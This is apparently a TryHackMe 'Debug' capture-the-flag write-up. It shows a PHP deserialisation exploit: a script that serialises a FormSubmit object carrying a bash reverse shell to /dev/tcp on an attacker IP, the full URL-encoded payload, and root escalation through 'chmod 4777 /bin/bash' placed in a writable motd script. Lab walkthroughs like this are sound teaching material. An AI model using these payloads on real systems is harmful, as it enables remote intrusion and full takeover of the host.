# Debug

---

Platform: Tryhackme

Difficulty: Medium

Initial Access: PHP deserialisation vulnerability

Privilege Escalation: Misconfigured File permissions

---

Nmap Scan:

```bash
┌──(ghost㉿kali)-[~/tryhackme/debug]
└─$ cat nmap.full 
# Nmap 7.95 scan initiated Wed Aug 13 01:00:03 2025 as: /usr/lib/nmap/nmap -Pn -A -p- --min-rate 4000 -oN nmap.full 10.201.23.26
Nmap scan report for 10.201.23.26
Host is up (0.24s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 (RSA)
|   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 (ECDSA)
|_  256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/13%OT=22%CT=1%CU=42752%PV=Y%DS=5%DC=T%G=Y%TM=689C1C1
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=A)SEQ
OS:(SP=104%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%
OS:CI=I%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=A)SEQ(SP=F9%GC
OS:D=1%ISR=10D%TI=Z%CI=RD%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT
OS:11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=6
OS:8DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q
OS:=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%
OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
OS:)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RU
OS:CK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Ports | Methodology |
| --- | --- |
| 22 (SSH) | Potentially for later use. |
| 80 (HTTP) | Apache httpd 2.4.18 version running on ubuntu. Have to look at what exactly is running there. |

Port 80:

Default Apache web page: It works!, nothing interesting even in source code.

<img width="1906" height="795" alt="image" src="https://github.com/user-attachments/assets/3c4bcbd2-6f99-48ec-8b3a-10d6f08191d2" />

And there was some static website hosted on `/index.php` endpoint.

<img width="1898" height="801" alt="image 1" src="https://github.com/user-attachments/assets/5532af9c-c4eb-4f02-b535-5db93a9811e8" />

Directory Fuzzing:

<img width="1680" height="740" alt="image 2" src="https://github.com/user-attachments/assets/afd9be0d-1051-4ab0-9aa5-c06f48f1c588" />

Direcoty fuzzing revealed an interesting endpoints to look - `/backup`  

<img width="1909" height="578" alt="image 3" src="https://github.com/user-attachments/assets/39090e9a-429a-4fc2-8c38-4f8604e3bc82" />

From all those files, one file `index.php.bak` is of our interest, which potentially holds backend code used for that `index.php` endpoint.

Downloading that file and reviewing it’s code revealed a juicy detail or maybe potential vulnerablility in that code, basically vulnerable to php deserialisation.

<img width="1536" height="667" alt="image 4" src="https://github.com/user-attachments/assets/6d2e8868-1de5-436a-86fe-fa1bab25c9da" />

What that code is doing?

- **Class Definition**
    - `FormSubmit` stores form data (`name`, `email`, `comments`) into a text file (`message.txt`).
    - `$form_file` is the file name.
    - `$message` stores the constructed message string.
- **SaveMessage() method**
    - Pulls values from `$_GET` without sanitization.
    - Builds `$this->message` with the form values.
- **__destruct() method**
    - Runs **automatically when the object is destroyed** (end of script).
    - Appends the `$message` to `message.txt` in the current directory.
    - Prints a success message.
- **Main execution**
    - `$debug = $_GET['debug'] ?? '';`
    - `$messageDebug = unserialize($debug);` ← **big problem**
    - Creates a new `FormSubmit` object.
    - Calls `SaveMessage()`.

Methodology:

- `unserialize()` on **unsanitized user input** (`$_GET['debug']`) lets an attacker create a serialized PHP object of any class — including `FormSubmit`.
- If an attacker injects a serialized `FormSubmit` object with a malicious `$form_file` (e.g., `/var/www/html/shell.php`) and `$message` containing PHP code, the destructor will **write** to that file, resulting in **Remote Code Execution (RCE)**.

---

### Initial Access

Following the above methodology, created a php serialised code containing for creating the payload, which contains reverse shell.

```bash
┌──(ghost㉿kali)-[~/tryhackme/debug]
└─$ cat test.php     
<?php
class FormSubmit {
    public $form_file = 'shell.php';
    public $message = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.17.87.131/4445 0>&1\'");';
}
echo urlencode(serialize(new FormSubmit));
?>
```

This script will 

- create a new class named `FormSubmit`
- `$form_file` variable set to `shell.php` , meaning if this object is unserialized by vulnerable code, and later the object’s destructor writes to `$form_file`, it will write to a file named `shell.php` .
- `$message` variable contains malicious PHP code that executes a reverse shell.
- `serialize(new FormSubmit)` : Makes an object with those malicious property values.
- `urlencode()` encodes for flawless URL delivery.

Generated final payload via this php code.

<img width="1906" height="128" alt="image 5" src="https://github.com/user-attachments/assets/aa431f96-cff5-4f82-920c-1e1383f08da4" />

At this point, just started netcat listner and delivered that payload to the `debug` parameter like these:

```bash
http://10.201.44.136/index.php?debug=O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A7%3A%22message%22%3Bs%3A71%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.17.87.131%2F4445+0%3E%261%27%22%29%3B%22%3B%7D
```

```bash
http://10.201.44.136/shell.php
```

And went to `/shell.php` endpoint to trigger that reverse shell and got the shell back on my machine.

<img width="1549" height="531" alt="image 6" src="https://github.com/user-attachments/assets/2d67d983-72d9-466f-a778-64ed6ea3704d" />

And here in that same directory, where we landed, there was a file `.htpasswd` which revealed james user’s password hash.

<img width="1746" height="85" alt="image 7" src="https://github.com/user-attachments/assets/a1b4977f-f9ee-4c14-a485-2b6aba75ce3c" />

Cracked that hash via john the ripper

<img width="1590" height="135" alt="image 8" src="https://github.com/user-attachments/assets/9238100f-1a7b-494f-8959-6e8cd8253da5" />

With the following credentials switched to user james in that same shell

<img width="1530" height="125" alt="image 9" src="https://github.com/user-attachments/assets/1b4ca604-0ba0-4d5d-9fff-f84f7b9c44d5" />

Grabbed user flag in the james’s home directory:

<img width="1381" height="80" alt="image 10" src="https://github.com/user-attachments/assets/87515ccd-09e2-436d-9a5c-0a18668eaf29" />

---

### Privilege Escalation

There was suspicious note file which revealed something juicy hint for us.

<img width="1667" height="432" alt="image 11" src="https://github.com/user-attachments/assets/16a1db57-b99b-4972-af60-d19a1f2bd0be" />

Found out files from /etc directory, on which user james had write access to.

<img width="1792" height="252" alt="image 12" src="https://github.com/user-attachments/assets/f5d7aec1-5d37-4c76-b7d0-3fee2c079679" />

Changed directory to `/etc/update-motd.d` where user james had write access and enumerating those files, found `00-header` file where we can easily add our commands too.

<img width="1685" height="379" alt="image 13" src="https://github.com/user-attachments/assets/2cec7dc8-0d64-44f4-b310-d92af2f15dbd" />

Simply added `chmod 4777 /bin/bash` command in that file, which will set SETUID bit on /bin/bash binary, when we log in as user james via ssh.

<img width="1147" height="31" alt="image 14" src="https://github.com/user-attachments/assets/f945a3eb-0472-40d5-96f9-2866dc0251c4" />

Logged in to user james account via SSH

<img width="1777" height="507" alt="image 15" src="https://github.com/user-attachments/assets/d8f083ac-839e-465e-9a2b-19b48e05c750" />

Executed /bin/bash binary and got euid set to root and now, we are able to read root.txt file.

<img width="1810" height="503" alt="image 16" src="https://github.com/user-attachments/assets/92039a31-162a-47f1-b118-1a562697a69c" />

---

That’s it for this machine.✅
